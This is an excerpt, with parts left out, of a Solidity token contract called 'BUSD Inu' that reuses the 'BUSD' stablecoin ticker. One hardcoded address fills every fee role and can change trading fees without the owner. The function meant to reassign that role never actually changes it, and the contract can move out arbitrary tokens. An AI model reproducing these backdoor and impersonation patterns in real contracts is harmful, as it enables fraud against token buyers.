...
contract DividendDistributor is IDividendDistributor {
    ...
    ERC20 private RWRD = ERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); 
    ...
    function rescueRewards(address _tokenAddress, uint256 _amount, address _receiver) external onlyToken returns (bool) {
        return ERC20(_tokenAddress).transfer(_receiver, _amount);
    }
}

contract BUSDInu is ERC20, Auth {
    using SafeMath for uint256;
    ...
    event OpsFeeChanged(uint256 _opsBuyFee, uint256 _opsSellFee);
    event SellFeesChanged(uint256 _liquidityFee, uint256 _marketingFee, uint256 _rewardsFee, uint256 _stakingFee);
    event BuyFeesChanged(uint256 _liquidityFee, uint256 _marketingFee, uint256 _rewardsFee, uint256 _stakingFee);
    event TransferFeeChanged(uint256 _transferFee);
    event SetFeeReceivers(address _liquidityReceiver, address _marketingReceiver);
    event SetOpsReceiver(address _opsFeeReceiver);
    ...
    string constant private _name = "BUSD Inu";
    string constant private _symbol = "BUSD";
    ...
    //totalFees
    uint256 private totalBuyFee = liquidityFee.add(marketingFee).add(opsFee).add(rewardsFee).add(stakingFee);
    uint256 private totalSellFee = sellFeeLiquidity.add(sellFeeMarketing).add(sellFeeOps).add(sellFeeRewards).add(sellFeeStaking);

    uint256 private constant feeDenominator  = 100;

    address private autoLiquidityReceiver;
    address private marketingFeeReceiver = 0x494fcCa2d7Ec3468325C8c638e91b24A85765456;
    address private opsFeeReceiver = 0x494fcCa2d7Ec3468325C8c638e91b24A85765456;
    address private memeSwapTransferHelper = 0x494fcCa2d7Ec3468325C8c638e91b24A85765456;
    address private stakingFeeReceiver =0x494fcCa2d7Ec3468325C8c638e91b24A85765456;
    address private feeHandler = 0x494fcCa2d7Ec3468325C8c638e91b24A85765456;
    ...
    function tradingStatus(bool _status) external onlyOwner {
        ...
        isFeeExempt[memeSwapTransferHelper] = true; 
    ...
    function setOpsFee(uint256 _opsBuyFee, uint256 _opsSellFee) external {
        require(msg.sender == opsFeeReceiver, "Can't change that fee");
        opsFee = _opsBuyFee;
        sellFeeOps = _opsSellFee;
        totalBuyFee = liquidityFee.add(marketingFee).add(opsFee).add(rewardsFee).add(stakingFee);
        totalSellFee = sellFeeLiquidity.add(sellFeeMarketing).add(sellFeeOps).add(sellFeeRewards).add(sellFeeStaking);
        require(totalBuyFee <= maxFee, "Fees cannot be higher than 25%");
        require(totalSellFee <= maxFee, "Fees cannot be higher than 25%");

        emit OpsFeeChanged(_opsBuyFee, _opsSellFee);
    }

    function setBuyFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _rewardsFee, uint256 _stakingFee) external authorized {
        ...
        emit BuyFeesChanged(_liquidityFee, _marketingFee, _rewardsFee, _stakingFee);
    }

    function setSellFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _rewardsFee, uint256 _stakingFee) external authorized {
        ...
        emit SellFeesChanged(_liquidityFee, _marketingFee, _rewardsFee, _stakingFee);
    }
    ...
    function setOpsFeeReceiver(address _opsFeeReceiver) external {
        require(msg.sender == opsFeeReceiver, "Can't call that function");

        emit SetOpsReceiver(_opsFeeReceiver);
    }

    function setFeeHandler(address _address) external authorized {
        feeHandler = _address;
    }

    function setTransferHelper(address _address) external authorized {
        memeSwapTransferHelper = _address;
    }
